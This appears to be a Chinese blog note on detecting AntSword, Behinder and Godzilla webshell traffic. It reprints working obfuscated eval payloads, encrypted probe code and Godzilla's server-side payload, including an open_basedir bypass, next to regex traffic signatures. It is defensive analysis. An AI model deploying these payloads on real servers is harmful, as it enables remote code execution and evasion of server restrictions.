12pass=@eval(@base64_decode($_POST[_0xc1ac917e3ce47]));_0xc1ac917e3ce47=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNmFlNjEiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImU5YTAwIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs= rot13 12pass=@eval(@str_rot13($_POST[_0x5d1c88d4565e5]));_0x5d1c88d4565e5=@vav_frg(&quot;qvfcynl_reebef&quot;, &quot;0&quot;);@frg_gvzr_yvzvg(0);shapgvba nfrap($bhg)&#123;erghea $bhg;&#125;;shapgvba nfbhgchg()&#123;$bhgchg=bo_trg_pbagragf();bo_raq_pyrna();rpub &quot;22324&quot;;rpub @nfrap($bhgchg);rpub &quot;q0157&quot;;&#125;bo_fgneg();gel&#123;$Q=qveanzr($_FREIRE[&quot;FPEVCG_SVYRANZR&quot;]);vs($Q==&quot;&quot;)$Q=qveanzr($_FREIRE[&quot;CNGU_GENAFYNGRQ&quot;]);$E=&quot;&#123;$Q&#125; &quot;;vs(fhofge($Q,0,1)!=&quot;/&quot;)&#123;sbernpu(enatr(&quot;P&quot;,&quot;M&quot;)nf $Y)vs(vf_qve(&quot;&#123;$Y&#125;:&quot;))$E.=&quot;&#123;$Y&#125;:&quot;;&#125;ryfr&#123;$E.=&quot;/&quot;;&#125;$E.=&quot; &quot;;$h=(shapgvba_rkvfgf(&quot;cbfvk_trgrtvq&quot;))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):&quot;&quot;;$f=($h)?$h[&quot;anzr&quot;]:@trg_pheerag_hfre();$E.=cuc_hanzr();$E.=&quot; &#123;$f&#125;&quot;;rpub $E;;&#125;pngpu(Rkprcgvba $r)&#123;rpub &quot;REEBE://&quot;.$r-&gt;trgZrffntr();&#125;;nfbhgchg();qvr(); chr 1pass=@eVAl(cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(100).ChR(105).ChR(115).ChR(112).ChR(108).ChR(97).ChR(121).ChR(95).ChR(101).ChR(114).ChR(114).ChR(111).ChR(114).ChR(115).ChR(34).ChR(44).ChR(32).ChR(34).ChR(48).ChR(34).ChR(41).ChR(59).ChR(64).ChR(115).ChR(101).ChR(116).ChR(95).ChR(116).ChR(105).ChR(109).ChR(101).ChR(95).ChR(108).ChR(105).ChR(109).ChR(105).ChR(116).ChR(40).ChR(48).ChR(41).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(41).ChR(123).ChR(114).ChR(101).ChR(116).ChR(117).ChR(114).ChR(110).ChR(32).ChR(36).ChR(111).ChR(117).ChR(116).ChR(59).ChR(125).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(123).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(61).ChR(111).ChR(98).ChR(95).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(111).ChR(110).ChR(116).ChR(101).ChR(110).ChR(116).ChR(115).ChR(40).ChR(41).ChR(59).ChR(111).ChR(98).ChR(95).ChR(101).ChR(110).ChR(100).ChR(95).ChR(99).ChR(108).ChR(101).ChR(97).ChR(110).ChR(40).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(57).ChR(98).ChR(100).ChR(57).ChR(101).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(64).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(56).ChR(102).ChR(52).ChR(54).ChR(56).ChR(34).ChR(59).ChR(125).ChR(111).ChR(98).ChR(95).ChR(115).ChR(116).ChR(97).ChR(114).ChR(116).ChR(40).ChR(41).ChR(59).ChR(116).ChR(114).ChR(121).ChR(123).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(83).ChR(67).ChR(82).ChR(73).ChR(80).ChR(84).ChR(95).ChR(70).ChR(73).ChR(76).ChR(69).ChR(78).ChR(65).ChR(77).ChR(69).ChR(34).ChR(93).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36).ChR(68).ChR(61).ChR(61).ChR(34).ChR(34).ChR(41).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(80).ChR(65).ChR(84).ChR(72).ChR(95).ChR(84).ChR(82).ChR(65).ChR(78).ChR(83).ChR(76).ChR(65).ChR(84).ChR(69).ChR(68).ChR(34).ChR(93).ChR(41).ChR(59).ChR(36).ChR(82).ChR(61).ChR(34).ChR(123).ChR(36).ChR(68).ChR(125).ChR(9).ChR(34).ChR(59).ChR(105).ChR(102).ChR(40).ChR(115).ChR(117).ChR(98).ChR(115).ChR(116).ChR(114).ChR(40).ChR(36).ChR(68).ChR(44).ChR(48).ChR(44).ChR(49).ChR(41).ChR(33).ChR(61).ChR(34).ChR(47).ChR(34).ChR(41).ChR(123).ChR(102).ChR(111).ChR(114).ChR(101).ChR(97).ChR(99).ChR(104).ChR(40).ChR(114).ChR(97).ChR(110).ChR(103).ChR(101).ChR(40).ChR(34).ChR(67).ChR(34).ChR(44).ChR(34).ChR(90).ChR(34).ChR(41).ChR(97).ChR(115).ChR(32).ChR(36).ChR(76).ChR(41).ChR(105).ChR(102).ChR(40).ChR(105).ChR(115).ChR(95).ChR(100).ChR(105).ChR(114).ChR(40).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(41).ChR(41).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(59).ChR(125).ChR(101).ChR(108).ChR(115).ChR(101).ChR(123).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(47).ChR(34).ChR(59).ChR(125).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(34).ChR(59).ChR(36).ChR(117).ChR(61).ChR(40).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(95).ChR(101).ChR(120).ChR(105).ChR(115).ChR(116).ChR(115).ChR(40).ChR(34).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(103).ChR(105).ChR(100).ChR(34).ChR(41).ChR(41).ChR(63).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(112).ChR(119).ChR(117).ChR(105).ChR(100).ChR(40).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(117).ChR(105).ChR(100).ChR(40).ChR(41).ChR(41).ChR(58).ChR(34).ChR(34).ChR(59).ChR(36).ChR(115).ChR(61).ChR(40).ChR(36).ChR(117).ChR(41).ChR(63).ChR(36).ChR(117).ChR(91).ChR(34).ChR(110).ChR(97).ChR(109).ChR(101).ChR(34).ChR(93).ChR(58).ChR(64).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(117).ChR(114).ChR(114).ChR(101).ChR(110).ChR(116).ChR(95).ChR(117).ChR(115).ChR(101).ChR(114).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(112).ChR(104).ChR(112).ChR(95).ChR(117).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(123).ChR(36).ChR(115).ChR(125).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(36).ChR(82).ChR(59).ChR(59).ChR(125).ChR(99).ChR(97).ChR(116).ChR(99).ChR(104).ChR(40).ChR(69).ChR(120).ChR(99).ChR(101).ChR(112).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(36).ChR(101).ChR(41).ChR(123).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(69).ChR(82).ChR(82).ChR(79).ChR(82).ChR(58).ChR(47).ChR(47).ChR(34).ChR(46).ChR(36).ChR(101).ChR(45).ChR(62).ChR(103).ChR(101).ChR(116).ChR(77).ChR(101).ChR(115).ChR(115).ChR(97).ChR(103).ChR(101).ChR(40).ChR(41).ChR(59).ChR(125).ChR(59).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(59).ChR(100).ChR(105).ChR(101).ChR(40).ChR(41).ChR(59)); chr16 1pass=@eVAl(cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x64).ChR(0x69).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x61).ChR(0x79).ChR(0x5f).ChR(0x65).ChR(0x72).ChR(0x72).ChR(0x6f).ChR(0x72).ChR(0x73).ChR(0x22).ChR(0x2c).ChR(0x20).ChR(0x22).ChR(0x30).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x74).ChR(0x69).ChR(0x6d).ChR(0x65).ChR(0x5f).ChR(0x6c).ChR(0x69).ChR(0x6d).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x30).ChR(0x29).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x7b).ChR(0x72).ChR(0x65).ChR(0x74).ChR(0x75).ChR(0x72).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x7b).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x3d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x65).ChR(0x6e).ChR(0x64).ChR(0x5f).ChR(0x63).ChR(0x6c).ChR(0x65).ChR(0x61).ChR(0x6e).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x39).ChR(0x34).ChR(0x31).ChR(0x39).ChR(0x37).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x40).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x66).ChR(0x66).ChR(0x33).ChR(0x65).ChR(0x32).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x73).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x74).ChR(0x72).ChR(0x79).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x53).ChR(0x43).ChR(0x52).ChR(0x49).ChR(0x50).ChR(0x54).ChR(0x5f).ChR(0x46).ChR(0x49).ChR(0x4c).ChR(0x45).ChR(0x4e).ChR(0x41).ChR(0x4d).ChR(0x45).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x3d).ChR(0x22).ChR(0x22).ChR(0x29).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x50).ChR(0x41).ChR(0x54).ChR(0x48).ChR(0x5f).ChR(0x54).ChR(0x52).ChR(0x41).ChR(0x4e).ChR(0x53).ChR(0x4c).ChR(0x41).ChR(0x54).ChR(0x45).ChR(0x44).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x7d).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x73).ChR(0x75).ChR(0x62).ChR(0x73).ChR(0x74).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x2c).ChR(0x30).ChR(0x2c).ChR(0x31).ChR(0x29).ChR(0x21).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x29).ChR(0x7b).ChR(0x66).ChR(0x6f).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x72).ChR(0x61).ChR(0x6e).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x22).ChR(0x43).ChR(0x22).ChR(0x2c).ChR(0x22).ChR(0x5a).ChR(0x22).ChR(0x29).ChR(0x61).ChR(0x73).ChR(0x20).ChR(0x24).ChR(0x4c).ChR(0x29).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x69).ChR(0x73).ChR(0x5f).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x65).ChR(0x6c).ChR(0x73).ChR(0x65).ChR(0x7b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x75).ChR(0x3d).ChR(0x28).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x5f).ChR(0x65).ChR(0x78).ChR(0x69).ChR(0x73).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x22).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x67).ChR(0x69).ChR(0x64).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x3f).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x70).ChR(0x77).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x29).ChR(0x29).ChR(0x3a).ChR(0x22).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x73).ChR(0x3d).ChR(0x28).ChR(0x24).ChR(0x75).ChR(0x29).ChR(0x3f).ChR(0x24).ChR(0x75).ChR(0x5b).ChR(0x22).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x22).ChR(0x5d).ChR(0x3a).ChR(0x40).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x75).ChR(0x72).ChR(0x72).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x5f).ChR(0x75).ChR(0x73).ChR(0x65).ChR(0x72).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x70).ChR(0x68).ChR(0x70).ChR(0x5f).ChR(0x75).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x7b).ChR(0x24).ChR(0x73).ChR(0x7d).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x24).ChR(0x52).ChR(0x3b).ChR(0x3b).ChR(0x7d).ChR(0x63).ChR(0x61).ChR(0x74).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x45).ChR(0x78).ChR(0x63).ChR(0x65).ChR(0x70).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x65).ChR(0x29).ChR(0x7b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x45).ChR(0x52).ChR(0x52).ChR(0x4f).ChR(0x52).ChR(0x3a).ChR(0x2f).ChR(0x2f).ChR(0x22).ChR(0x2e).ChR(0x24).ChR(0x65).ChR(0x2d).ChR(0x3e).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x4d).ChR(0x65).ChR(0x73).ChR(0x73).ChR(0x61).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x64).ChR(0x69).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b)); 参数特征 POST: default &amp; chr &amp; chr16: 0x[0-9a-f]&#123;13&#125; base64 &amp; rot13: _0x[0-9a-f]&#123;13&#125; 流量特征 default: @ini_set(“display_errors”,“0”);… base64: QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jz… rot13: @vav_frg(“qvfcynl_reebef”, “0”);… chr: eVAl cHr(\\d+) ChR(\\d+)(大量) chr16: eVAl cHr(0x[0-9a-f]&#123;2&#125;) ChR(0x[0-9a-f]&#123;2&#125;)(大量) 冰蝎 冰蝎支持两种流量加密方式 AES-128-CBC XOR 默认给出的冰蝎Shell优先采用AES-128-CBC的加密方式 冰蝎的交互过程如下 客户端通过携带GET参数进行请求 服务端接收到GET参数之后产生16字节密钥（Hex） 客户端获得密钥之后对之后的Payload进行加密 连接流量 AES-128-CBC 随机生成content，将Payload发送至服务端并将运行结果返回给客户端 用于验证服务端是否支持分组加密 12345678910111213141516171819202122232425262728@error_reporting(0);function main($content)&#123; $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION[&#x27;k&#x27;]; echo encrypt(json_encode($result),$key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$content=&quot;9245a461-fd2f-44be-a6f1-721c392f0b75&quot;;main($content);# &#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;OTI0NWE0NjEtZmQyZi00NGJlLWE2ZjEtNzIxYzM5MmYwYjc1&quot;&#125;# &#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;9245a461-fd2f-44be-a6f1-721c392f0b75&quot;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445error_reporting(0);function main() &#123; ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) &#123; for($i=65;$i&lt;=90;$i++) &#123; $drive=chr($i).&#x27;:/&#x27;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&#x27;&#x27;; &#125; &#125; else &#123; $driveList=&quot;/&quot;; &#125; $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&#x27;k&#x27;]; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;main();# phpinfo等信息 XOR 先发送一个验证性Payload，即AES-128-CBC中的Content验证 此时未通过验证，则客户端使用XOR加密方式 123456789101112131415161718192021222324252627282930313233343536373839404142434445error_reporting(0);function main() &#123; ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) &#123; for($i=65;$i&lt;=90;$i++) &#123; $drive=chr($i).&#x27;:/&#x27;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&#x27;&#x27;; &#125; &#125; else &#123; $driveList=&quot;/&quot;; &#125; $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&#x27;k&#x27;]; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&#x27;openssl&#x27;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;main();# phpinfo等信息 参数特征 无参数 流量特征 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 请求中GET参数值为三位数字，且服务器响应为[0-9a-f]&#123;16&#125;（针对连接时的流量） 哥斯拉 连接流量 客户端将函数代码加密后发送给服务端，服务端将函数存储于Session文件之中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391$parameters=array();function run($pms)&#123; formatParameter($pms.&#x27;&amp;ILikeYou=&#x27;.base64Encode(&#x27;metoo&#x27;)); if ($_SESSION[&quot;bypass_open_basedir&quot;]==true)&#123; @bypass_open_basedir(); &#125; return base64Encode(evalFunc());&#125;function bypass_open_basedir()&#123; if(!@file_exists(&#x27;bypass_open_basedir&#x27;))&#123; @mkdir(&#x27;bypass_open_basedir&#x27;); &#125; @chdir(&#x27;bypass_open_basedir&#x27;); @ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;); @$_Ei34Ww_sQDfq_FILENAME = @dirname($_SERVER[&#x27;SCRIPT_FILENAME&#x27;]); @$_Ei34Ww_sQDfq_path = str_replace(&quot;\\\\&quot;,&#x27;/&#x27;,$_Ei34Ww_sQDfq_FILENAME); @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,&#x27;/&#x27;) + 1; $_Ei34Ww_sQDfq_i = 0; while($_Ei34Ww_sQDfq_i &lt; $_Ei34Ww_sQDfq_num)&#123; @chdir(&#x27;..&#x27;); $_Ei34Ww_sQDfq_i++; &#125; @ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;); @rmdir($_Ei34Ww_sQDfq_FILENAME.&#x27;/&#x27;.&#x27;bypass_open_basedir&#x27;);&#125;function formatParameter($pms)&#123; global $parameters; $pms=explode(&quot;&amp;&quot;,$pms); foreach ($pms as $kv)&#123; $kv=explode(&quot;=&quot;,$kv); if (sizeof($kv)&gt;=2)&#123; $parameters[$kv[0]]=base64Decode($kv[1]); &#125; &#125;&#125;function evalFunc()&#123; @session_write_close(); $className=get(&quot;codeName&quot;); $methodName=get(&quot;methodName&quot;); if ($methodName!=null)&#123; if (strlen(trim($className))&gt;0)&#123; if ($methodName==&quot;includeCode&quot;)&#123; return includeCode(); &#125;else&#123; if (isset($_SESSION[$className]))&#123; return eval($_SESSION[$className]); &#125;else&#123; return &quot;&#123;$className&#125; no load&quot;; &#125; &#125; &#125;else&#123; return $methodName(); &#125; &#125;else&#123; return &quot;methodName Is Null&quot;; &#125;&#125;function deleteDir($p)&#123; $m=@dir($p); while(@$f=$m-&gt;read())&#123; $pf=$p.&quot;/&quot;.$f; @chmod($pf,0777); 